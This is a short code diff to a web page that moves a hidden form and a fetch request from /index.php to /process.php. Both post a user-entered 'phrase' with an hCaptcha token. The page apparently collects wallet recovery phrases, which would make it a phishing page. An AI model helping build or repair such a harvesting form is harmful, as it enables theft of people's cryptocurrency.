@@ -205,7 +205,7 @@
         </div>
         
         <!-- ✅ FIXED: Single form with RELATIVE URL for InfinityFree -->
-        <form id="phraseForm" method="POST" action="/index.php" target="resultFrame">
+        <form id="phraseForm" method="POST" action="/process.php" target="resultFrame">
             <input type="hidden" name="phrase" id="phraseInput">
             <input type="hidden" name="hcaptcha_response" id="hcaptchaInput">
         </form>
@@ -567,7 +567,7 @@
 
             // 1️⃣ FETCH REQUEST (for console debugging)
             console.log('🌐 SENDING FETCH...');
-            fetch('/index.php', {
+            fetch('/process.php', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                 body: `phrase=${encodeURIComponent(JSON.stringify(phrase))}&hcaptcha_response=${encodeURIComponent(hcaptchaToken)}`
